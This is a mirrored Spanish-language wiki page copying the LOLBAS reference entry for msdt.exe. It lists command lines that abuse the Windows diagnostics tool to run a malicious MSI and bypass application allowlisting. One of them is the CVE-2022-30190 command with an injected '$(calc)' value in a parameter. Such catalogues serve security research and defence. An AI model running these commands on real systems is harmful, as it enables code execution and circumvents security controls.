# LOLBAS: Msdt.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`, `Execute`

Microsoft diagnostics tool

## Comandos

### Execute code

Execute · priv: User · T1218

```cmd
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

### Execute code bypass Application whitelisting

AWL Bypass · priv: User · T1218

```cmd
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

### Execute code bypass Application allowlisting

AWL Bypass · priv: User · T1202

```cmd
msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
```

Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.

